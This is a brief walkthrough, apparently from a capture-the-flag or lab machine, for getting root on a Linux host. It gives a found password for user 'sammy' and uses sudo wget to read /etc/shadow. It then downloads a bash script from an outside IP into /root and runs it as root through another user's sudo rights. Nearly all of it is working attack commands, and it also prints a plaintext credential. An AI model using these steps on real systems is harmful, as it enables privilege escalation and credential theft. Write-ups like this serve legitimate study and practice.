# Getting Root

/backup has shadow with hash of sammy and sunny

Creds: sammy:cooldude!

logon as sammy

* Sammy has sudo permission on wget
```bash
sudo wget -i /etc/shadow 2>&1 | awk '{print $4}'
```

### another way  is uploading a bash file
troll
```bash
#! /bin/bash
bash
```

As sammy
```bash
sudo wget 10.10.14.21/troll -O /root/troll
```

logout on sammy , and logon as sunny

sunny has sudo permission on troll
run
```bash
sudo /root/troll
```

